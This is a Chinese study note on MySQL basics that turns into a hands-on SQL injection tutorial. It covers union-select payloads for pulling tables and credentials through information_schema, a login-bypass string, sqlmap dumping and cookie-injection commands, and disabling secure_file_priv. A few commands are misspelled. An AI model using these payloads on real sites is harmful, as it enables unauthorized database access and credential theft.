# MySQL 基础

## 一、环境

1. phpstudy2018, WIN

## 二、数据库的相关概念

* 结构：数据库一般是由 数据库、数据表、字段 三层结构组成。（需要注意的是：字段是指列，行用 记录 来表示）

## 三、相关使用

1. 进入 `mysql` 命令行

    * way1: 在 phpstudy 的面板中 --> 其他选项 --> MySQL 工具 --> MySQL 命令行
    * way2: 在 phpstudy 的安装目录下 `xxx\phpStudy\PHPTutorial\MySQL\bin` 打开 `cmd` --> 输入 `mysql.exe -h localhost -u root -p` 后输入密码 root

    > 用户名和密码都是 root

2. SQL 语言

* 是 结构化查询语言。
* 不管用什么数据库，MYSQL, access 都好，都是用 SQL 语言对数据库进行操作

```cmd
show databases;        # 查看数据库
create datebase test;  # 创建 test 数据库
drop database test;    # 删除 test 数据库

use test;              # 使用 test 数据库
select database();     # 查看当前使用的数据库

show tables;           # 查看当前数据库的 数据表
desc users;             # 查看 user 这个表的结构
create table users(     # 创建 user 数据表，然后输入字段，如下：

#    mysql> create table user(
#        -> id int(10) AUTO_INCREMENT,
#        -> name varchar(50) not null,
#        -> password varchar(50) not null,
#        -> primary key(id)
#        -> );

alter table users change name username varchar(50);  # 修改 users 数据表 的 name 字段为 username，再接一个 类型。

# 增删改查
insert into users values (1,"yiya","yiya");  # 在 user表 添加记录。记录的内容 和字段的顺序，类型一样
delete from users where username="yiya";  # 删除 user表 里 username 字段的值为 yiya 的数据
update users set id=3 where id=5;  # 更新 users表 里 id=5 的数据的 id为3
select * from users;  # 在 users表 里查询 *（所有）数据
select * from users where id=1 and username="yiya";
select username,password from users;  # 查询 username,password 字段的记录

# 常用函数 database() user() version()
select database();    # 查看当前使用的数据库
select user();        # 查看当前数据库的拥有者
select version();     # 查看数据库的版本

# 加载、输出文件 操作
select load_file("d:/1.txt");  # 加载文件。（出现 NULL, 看问题1）
select "hello 2.txt" into dumpfile "d:/2.txt"  # 导出 “hello 2.txt” 到 d 盘的 2.txt。（只能导出一行）
select "hello 2.txt" into outfile "d:/2.txt"  # 和 into dumpfile 不同的是，可以导出多行
```

## sql 注入

```sql
# 判断 login表 是否存在
select * from test where id=1 and exits(select * from login);

# 判断 表的字段 有多少
select * from test order by 2;  # 2 代表按照查询的结果中 第2个字段来排序；如果，查询结果的字段数量没有 2 个就会报错。

# 查询别的表
select * from test union select username,password from users;  # 在 test表 下显示 users表
# 如果两个表的字段数量不一样，怎么办？如：test表有2个字段，users表有3个字段，上面的语句是可以执行的，因为 union 要求返回的结果的列是一致的。但是，如果在 users表 下显示 test表 怎么做呢？
select * from users union select * from test;  # 报错：test表只有2字段，users表有3字段。
select * from users union select 1,2,3 from test;  # 正常。这里采用了 赋值 进行代替 字段的记录，但是这样 查询的结果就会显示 1，2，3 而不是 test 表的记录了。修改如下：
select * from users union select 1,id,title from test;  # 这样的结果，test表的 id,title 字段就会显示出来，第一列就用1表示。
```

## 注释

三种方法：

* way1: 以 `#` 开头；
* way2：以 `-- ` 开头（注意 `-- `与注释内容之间要加空格！）
* way3:：`/**/`

## 实战

### asp + access

* 搭站软件有：`asp小旋风2018`
* 针对此搭配的软件有：啊D，明小子。

1. 判断是否存在 注入点

    * 思路：注入点 即 浏览器使用 get 方式向服务器提交参数的页面（如：`192.168.1.1/shownews.asp?id=23`），然后在这个 url 后加上 `and 1=1` 没错误，再试下 `and 1=2` 报错。说明这个网页 把我们加上的代码 也执行了。所以这就是个注入点。（另外：url 提交后 空格转成 `%20` 显示）

2. 猜表名

    当存在注入点后，就可以通过 `url and exists(select * from admin)` 来判断是否存在 admin表
    * 常用的表名 `admin` `user` `adminiuser` `manage` `manager` `manage_user`

3. 猜字段名

    当猜到表后，就开始猜 字段名了。通过 `url and exists(select password from admin)` （当实在猜不中的时候，可以先找网站后台，看看登录框的账户密码的 html 源代码，看看它的值，再试一下这个值是不是字段名）
    * 常用字段名

        * 账号 `name username` `user_name` `admin` `adminuser` `admin_user` `admin_username` `adminname`
        * 密码 `password` `pass` `userpass` `user_pass` `pwd` `userpwd` `adminpwd` `admin_pwd`

4. 显示数据

    * 方法一

      * step1：首先，判断表中有多少字段，通过 `url order by 20` 先判断有没有20个，在慢慢缩小判断。
      * step2：假设字段总共有8个，在通过 `url union select 1,2,3,4,5,6,7,8 from manage_user`，此时看看页面中，这些数字哪些是显示出来的。
      * step3：把想要查的字段名 填到 对应的数字中（如：2，4是显示出来的），则 `url union select 1,username,3,password,5,6,7,8 from manage_user`

    * 方法二：
      有时候 `order by` 不能用的时候，可以直接上 `url union select 1,2,3,4,5,6,7,8 from manage_user`，这样既可以查字段数量，又可获知可以显示内容的字段。

5. 最后找网站后台

### php + mysql

* 搭站软件有：`phpstudy` `NPMserv 0.5.0`
* 针对此搭配的软件有：穿山甲（Pangolin），胡萝卜（Havij）

在 mysql 中，不用猜表名，字段名了，因为 5.0 以后的 mysql 中存在一个**元数据库** `information_schema` 其中，储存在用户在 mysql 中创建的所有其他数据库的信息。所以在对 PHP+MySQL 类网站进行注入时，主要针对该数据库进行操作。

information_schema 中比较重要的 数据表：

* schemata: 存放所有数据库的名字
* tables: 存放数据库中的数据表的名字
* columns: 存放所有数据表中所有字段的名字

```sql
# 只有 5.0 以上的 mysql 才行，因为有 元数据库
select table_name from information_schema.tables where table_schema="test";  # 查看 test 数据库中包含了哪些表
select column_name from information_schema.columns where table_name="hack";  # 查看 hack 数据表中包含哪些字段
```

1. 找 注入点

    这步和 access 数据库中的操作一样

2. 查 字段的数量

    * 因为 mysql 和 access 数据库不一样，mysql 可以不用 from表 就做 union 查询。所以，这里可以通过 `url union select 1,2,3,4,5` 进行查询，同时看看 哪个位置的字段有显示，就可以把 字段名放进去查。
    * 问题：有时候，不会输出 我们自己插入的语句，怎么办？如 `xxx.php?info_id=12 union select 1,2,3,4,5` 网页上只显示 union 前面的内容，这时候可通过 `xxx.php?info_id=12 and 1=2 union select 1,2,3,4,5` 进行把前面的语句屏蔽，显示我们插入的语句的效果！（`xxx.php?info_id=12 and 1=2 union select 1,version(),user(),4,5` 进行对数据库版本的查看，只有5.0以上的才行，因为5.0才有元数据库，才能进行下一步）

3. 查数据库的名字

    `xxx.php?info_id=12 and 1=2 union select 1,version(),user(),database(),5`

4. 查数据库包含哪些表

    `xxx.php?info_id=12 and 1=2 union select 1,2,table_name,4,5 from information_schema.tables where table_schema="换成上一步查到的数据库名字";`
    * 问题：有时候数据有很多个，但是网页只显示了一个，怎么办？用 `group_concat(字段名)` （该函数可以显示字段中的所有内容）
    `xxx.php?info_id=12 and 1=2 union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema="换成上一步查到的数据库名字";` 这样就可以把所有字段的记录显示到一块

5. 查看表中 包含 哪些字段

    `xxx.php?info_id=12 and 1=2 union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_name="上一步的表名";`

6. 查看账号密码

    经过4，5都知道了 表名（设admin）和字段名(设username,password)，直接查询就可以了。
    `url and 1=2 union select 1,username,password,4,5 from admin`
    * 问题：有时候显示不出来，可能是因为编码的问题，解决方法如下：
    `url and 1=2 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin`

### 密码绕过

原理：接受参数的 页面是这样写的：`select * from admin where username='$username' and password='$mpassword'`

在登录框里的用户名，输入 `1' or 1=1 or '1`，这样页面接受的如下：
`select * from admin where username='1' or 1=1 or '1' and password='$mpassword'`，也就是 假 or 真 or 真 and 假 = 真。（输入 `' or '=' or '` 也行）

* 变种1：针对过滤 `or`
    `1' OR 1=1 OR '1`

* 变种2：针对把 `'` replace掉的
    搞不了

## SQLMAP 的使用

* 环境：sqlmap 需要安装 Python环境
* 把 sqlmap 解压后，放到 Python 的安装目录下，即 `d:\python\sqlmap`

### 对于 access 数据库

* 因为需要猜 表名，字段名 所以和 mysql 不一样

```python
sqlmap.py  # cmd 中直接运行，测试一下能不能正常运行
sqlmap.py -u "http://xxx.asp?id=23"  # 测试该页面有没有注入漏洞
    # 如果存在可注入的参数会提示 “Get parameter 'id' is vulnerable...”
    # 还会告诉你类型 Type: boolean-based blind （盲注的意思）

sqlmap.py -u "http://xxx.asp?id=23" --tables  # 猜解所有的表
    # 如果无法直接获得表的名字，会问你是否使用 common table 来一个个配对，然后还问你开几个线程
    # 这个 common table 在 sqlmap/txt/common-tables.txt 中（如果是 Linux，在/usr/share/sqlmap/txt/common-tables.txt 中）

sqlmap.py -u "http://xxx.asp?id=23" --columns -T "user"  # 猜解字段，-T 指定表名

sqlmap.py -u "http://xxx.asp?id=23" --dump -C "username,password" -T "user"  # 查询字段的记录 
```

### 对于 mysql 数据库

```python
sqlmap.py -u "http://xxx.asp?id=23"
sqlmap.py -u "http://xxx.asp?id=23" --dbs  # 直接出 数据库
sqlmap.py -u "http://xxx.asp?id=23" --current-db  # 查询当前数据库
sqlmap.py -u "http://xxx.asp?id=23" --current-user  # 查询当前用户
sqlmap.py -u "http://xxx.asp?id=23" --version  # 查询当前数据库版本
sqlmap.py -u "http://xxx.asp?id=23" --current-dba  # 查询当前用户是不是管理员
sqlmap.py -u "http://xxx.asp?id=23" --tables -D "govcn"  # -D 指定 数据库名字
sqlmap.py -u "http://xxx.asp?id=23" --columns -T "admin" -D "govcn"  # 查询字段
sqlmap.py -u "http://xxx.asp?id=23" --dump -C "username,password" -T "admin" -D "govcn"  # 查询字段的记录
```

#### SQLMAP小结

1. 注入 ACCESS 和 mysql 不一样的是，mysql 可以知道所有数据库的名字，access 好像没见到需要猜数据库的，都是直接猜表名（猜有账号密码的表名）

#### sqlmap 使用的问题

1. 如果中途停止了 sqlmap 的获取表 的命令，再次执行，它会直接把上次的结果给你！
   * 原因：sqlmap 每次运行完后，会在 `c:\users\username\.sqlmap\output` 中保存对网站 测试的结果
   * 解决方法：把 该网站的 结果文件夹 删掉重新测试就可以了。

## cookie 注入

* cookie 用于在客户端本地保存用户访问网站时的一些身份验证信息（例如：网页上的十天内免登录）
* cookie 与 get、post 方法一样，都可用于客户端向服务端传递数据。（所以，可以把 sql语句放到 cookie 里进行注入）
* 当传统的 get,post 方式都不能 注入的时候（在url中提交参数时被过滤），试试 cookie注入

```shell
sqlmap.py -u "xxx.asp" --cookie "id=16" --level 2
    # --level 指定探测等级，默认为 1
    # level 1，探测 GET 和 POST 数据
    # level 2，探测 cookie 数据
sqlmap.py -u "xxx.asp" --cookie "id=16" --level 2 --tables  # 然后跟传统的参数设置差不多了
```

## 问题

1. `select load_file("d:/1.txt")` 后显示 NULL

    * 问题原因：5.5 版本之后的 mysql 新特性 `secure_file_priv` 对读写文件的影响。输入 `SHOW VARIABLES LIKE "secure_file_priv";` 可查看对应的值。
    * 解决方法：windows 下 打开 `xxx\phpStudy\PHPTutorial\MySQL\my.ini`，在 `[mysqld]` 下 添加 `secure_file_priv =`。然后重启 phpstudy，重新进入命令行。

## 参考

1. [Mysql 导入文件提示 --secure-file-priv option 问题](https://www.cnblogs.com/Braveliu/p/10728162.html)（解决 mysql 导入导出文件问题）
2. [数据库（SQL）中什么是表、字段、记录？谢谢了，大神帮忙啊](https://zhidao.baidu.com/question/1548387356866736827.html)
